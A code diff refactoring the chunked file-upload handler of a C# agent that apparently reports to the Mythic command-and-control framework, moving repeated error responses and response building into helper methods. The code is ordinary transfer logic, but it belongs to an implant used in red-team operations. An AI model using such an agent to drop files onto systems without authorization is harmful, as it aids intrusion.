@@ -105,113 +105,55 @@ namespace Agent
             ServerUploadJob uploadJob = this.GetJob(response.task_id);
 
             //Did we get an upload job
-            if(uploadJob is null)
+            if (uploadJob == null)
             {
-                await messageManager.AddResponse(new TaskResponse
-                {
-                    status = "error",
-                    completed = true,
-                    task_id = response.task_id,
-                    user_output = "Failed to get job",
-                }.ToJson());
+                await AddErrorResponse(response.task_id, "Failed to get job", true);
                 return;
             }
 
-            //Did user request cancellation of the job?
             if (uploadJob.cancellationtokensource.IsCancellationRequested)
             {
-                await messageManager.AddResponse(new TaskResponse
-                {
-                    status = "error",
-                    completed = true,
-                    task_id = response.task_id,
-                    user_output = "Cancellation Requested",
-                }.ToJson());
-                this.CompleteUploadJob(response.task_id);
+                await AddErrorResponse(response.task_id, "Cancellation Requested", true);
+                CompleteUploadJob(response.task_id);
                 return;
             }
 
-            //Update the chunks required for the upload
             if (uploadJob.total_chunks == 0)
             {
-                if(response.total_chunks == 0)
+                if (response.total_chunks == 0)
                 {
-                    await messageManager.AddResponse(new TaskResponse
-                    {
-                        status = "error",
-                        completed = true,
-                        task_id = response.task_id,
-                        user_output = "Failed to get number of chunks",
-                    }.ToJson());
+                    await AddErrorResponse(response.task_id, "Failed to get number of chunks", true);
                     return;
                 }
 
-                uploadJob.total_chunks = response.total_chunks; //Set the number of chunks provided to us from the server
+                uploadJob.total_chunks = response.total_chunks;
             }
 
-            //Did we get chunk data?
-            if (String.IsNullOrEmpty(response.chunk_data)) //Handle our current chunk
+            if (string.IsNullOrEmpty(response.chunk_data))
             {
-                await messageManager.AddResponse(new TaskResponse
-                {
-                    status = "error",
-                    completed = true,
-                    task_id = response.task_id,
-                    process_response = new Dictionary<string, string> { { "message", "0x12" } },
-
-                }.ToJson());
+                await AddErrorResponse(response.task_id, "No chunk data received", true);
                 return;
             }
 
-            //Write the chunk data to our stream
-            if(!this.HandleNextChunk(Misc.Base64DecodeToByteArray(response.chunk_data), response.task_id))
+
+            if (!HandleNextChunk(Misc.Base64DecodeToByteArray(response.chunk_data), response.task_id))
             {
-                await messageManager.AddResponse(new TaskResponse
-                {
-                    status = "error",
-                    completed = true,
-                    task_id = response.task_id,
-                    user_output = "Failed to process message.",
-                }.ToJson());
-                this.CompleteUploadJob(response.task_id);
+                await AddErrorResponse(response.task_id, "Failed to process message.", true);
+                CompleteUploadJob(response.task_id);
                 return;
             }
 
-            //Increment chunk number for tracking
             uploadJob.chunk_num++;
 
-            //Prepare response to Mythic
-            UploadTaskResponse ur = new UploadTaskResponse()
-            {
-                task_id = response.task_id,
-                status = $"Processed {uploadJob.chunk_num}/{uploadJob.total_chunks}",
-                upload = new UploadTaskResponseData
-                {
-                    chunk_num = uploadJob.chunk_num,
-                    file_id = uploadJob.file_id,
-                    chunk_size = uploadJob.chunk_size,
-                    full_path = uploadJob.path
-                }
-            };
+            UploadTaskResponse uploadResponse = PrepareResponse(response, uploadJob);
 
-            //Check if we're done
             if (response.chunk_num == uploadJob.total_chunks)
             {
-                ur = new UploadTaskResponse()
-                {
-                    task_id = response.task_id,
-                    upload = new UploadTaskResponseData
-                    {
-                        file_id = uploadJob.file_id,
-                        full_path = uploadJob.path,
-                    },
-                    completed = true
-                };
-                this.CompleteUploadJob(response.task_id);
+                uploadResponse.completed = true;
+                CompleteUploadJob(response.task_id);
             }
 
-            //Return response
-            await messageManager.AddResponse(ur.ToJson());
+            await messageManager.AddResponse(uploadResponse.ToJson());
         }
 
         /// <summary>
@@ -265,6 +207,49 @@ namespace Agent
         private ServerUploadJob GetJob(string task_id)
         {
             return uploadJobs[task_id];
+        }
+
+        private async Task AddErrorResponse(string taskId, string userOutput, bool isCompleted)
+        {
+            await messageManager.AddResponse(new TaskResponse
+            {
+                status = "error",
+                completed = isCompleted,
+                task_id = taskId,
+                user_output = userOutput,
+            }.ToJson());
+        }
+
+        private UploadTaskResponse PrepareResponse(ServerResponseResult response, ServerUploadJob uploadJob)
+        {
+            var uploadResponse = new UploadTaskResponse()
+            {
+                task_id = response.task_id,
+                status = $"Processed {uploadJob.chunk_num}/{uploadJob.total_chunks}",
+                upload = new UploadTaskResponseData
+                {
+                    chunk_num = uploadJob.chunk_num,
+                    file_id = uploadJob.file_id,
+                    chunk_size = uploadJob.chunk_size,
+                    full_path = uploadJob.path
+                }
+            };
+
+            if (response.chunk_num == uploadJob.total_chunks)
+            {
+                uploadResponse = new UploadTaskResponse()
+                {
+                    task_id = response.task_id,
+                    upload = new UploadTaskResponseData
+                    {
+                        file_id = uploadJob.file_id,
+                        full_path = uploadJob.path,
+                    },
+                    completed = true
+                };
+            }
+
+            return uploadResponse;
         }
     }
 }
